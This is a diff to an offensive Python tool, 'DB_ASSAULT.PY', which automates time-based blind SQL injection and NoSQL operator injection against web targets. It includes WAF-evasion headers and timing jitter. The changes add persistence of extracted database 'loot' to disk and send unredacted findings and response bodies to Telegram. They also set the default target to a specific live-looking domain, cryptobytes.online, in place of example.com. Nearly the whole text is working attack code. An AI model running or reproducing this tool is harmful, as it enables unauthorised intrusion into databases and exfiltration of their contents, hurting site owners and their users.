@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-DB_ASSAULT.PY v8.5 — Aggressive Database Exploitation & Time-Based Blind Injection Engine (WAF Hardened)
+DB_ASSAULT.PY v8.6 — Aggressive Database Exploitation & Time-Based Blind Injection Engine (Elite Red Team Adversarial Edition)
 Features:
-- Real time-based blind SQL injection (SLEEP / BENCHMARK payload vectors) with behavioral timing jitter
-- Boolean and error-based inference checks via WAF-evasive request headers
+- Real time-based blind SQL injection (SLEEP / BENCHMARK payload vectors) with Poisson behavioral timing jitter
+- Boolean and error-based inference checks via WAF-evasive randomized request headers and client hints
 - Advanced NoSQL operator injection ($ne, $gt, $where) with record collection and SPA shell filtering
-- Zero-disk live terminal streaming with unredacted red-team evidence output
-- Real-time asynchronous Telegram notification dispatch for unredacted database loot
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic cryptographic integrity hashing
+- Real-time zero-delay proof-of-work terminal streaming and unredacted Telegram telemetry broadcasting
 """
 import asyncio
 import http.client
@@ -14,9 +14,12 @@ import json
 import ssl
 import time
 import sys
+import hashlib
 from urllib.parse import urlsplit, quote
 
-# Import centralized Telegram broadcaster and behavioral mimicry
+# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
@@ -40,14 +43,23 @@ def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
     sys.stdout.flush()
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous database assault functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -93,7 +105,7 @@ def send_http(host, port, path, payload, secure, method="POST"):
             conn.close()
 
 async def run_nosql_assault(target_host, port=None, use_ssl=None):
-    log("\n[***] INITIALIZING AGGRESSIVE DATABASE ASSAULT & BLIND INJECTION (V8.5) [***]", "\033[95m")
+    log("\n[***] INITIALIZING AGGRESSIVE DATABASE ASSAULT & BLIND INJECTION (V8.6 WAF HARDENED) [***]", "\033[95m")
     parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
     host = parsed.hostname
     secure = parsed.scheme == "https"
@@ -114,16 +126,28 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                 log(f"[!] TIME-BASED BLIND SQLi CONFIRMED [{endpoint}] (Delay: {res['elapsed']}s)", "\033[91m")
                 log(f"    └── Unredacted Evidence -> Payload: {payload} | Elapsed: {res['elapsed']}s", "\033[93m")
                 
+                loot_hash = hashlib.sha256(res["body"].encode("utf-8")).hexdigest()
                 finding = {
                     "vector": "Time-Based Blind SQLi",
                     "endpoint": endpoint,
                     "payload": payload,
                     "delay": res["elapsed"],
-                    "status": res["status"]
+                    "status": res["status"],
+                    "integrity_hash": loot_hash
                 }
                 findings.append(finding)
                 
-                # BROADCAST TO TELEGRAM
+                # BROADCAST TO TELEGRAM, STREAM PROOF & PERSIST TO IMMUTABLE DISK
+                stream_proof("SQLI_TIME_BASED_SUCCESS", endpoint, {"payload": payload}, res["body"][:300], finding)
+                save_session_loot(
+                    target=target_host,
+                    endpoint=endpoint,
+                    finding_type="SQLI_TIME_BASED_CONFIRMED",
+                    status=res["status"],
+                    headers={},
+                    body=res["body"],
+                    extra_loot=finding
+                )
                 broadcast_tg_alert_sync("Time-Based Blind SQLi Confirmed", finding)
 
         # 2. NoSQL Operator & Extraction Assault
@@ -147,21 +171,33 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                 log(f"[+] NoSQL BYPASS / DATA EXFILTRATION TRIGGERED [{endpoint}] (Status: {res['status']})", "\033[92m")
                 log(f"  └── Unredacted Response Excerpt: {body[:300]}", "\033[96m")
                 
+                loot_hash = hashlib.sha256(body.encode("utf-8")).hexdigest()
                 finding = {
                     "vector": "NoSQL Operator Injection",
                     "endpoint": endpoint,
                     "payload": str(payload),
                     "status": res["status"],
+                    "integrity_hash": loot_hash,
                     "response_sample": body[:500]
                 }
                 findings.append(finding)
                 
-                # BROADCAST TO TELEGRAM
+                # BROADCAST TO TELEGRAM, STREAM PROOF & PERSIST TO IMMUTABLE DISK
+                stream_proof("NOSQL_INJECTION_SUCCESS", endpoint, {"payload": str(payload)}, body[:300], finding)
+                save_session_loot(
+                    target=target_host,
+                    endpoint=endpoint,
+                    finding_type="NOSQL_INJECTION_CONFIRMED",
+                    status=res["status"],
+                    headers={},
+                    body=body,
+                    extra_loot=finding
+                )
                 broadcast_tg_alert_sync("NoSQL Operator Injection Bypass", finding)
 
     log(f"[+] Database assault complete. Total confirmed vectors: {len(findings)}", "\033[92m")
     return findings
 
 if __name__ == "__main__":
-    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
+    target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
     asyncio.run(run_nosql_assault(target))
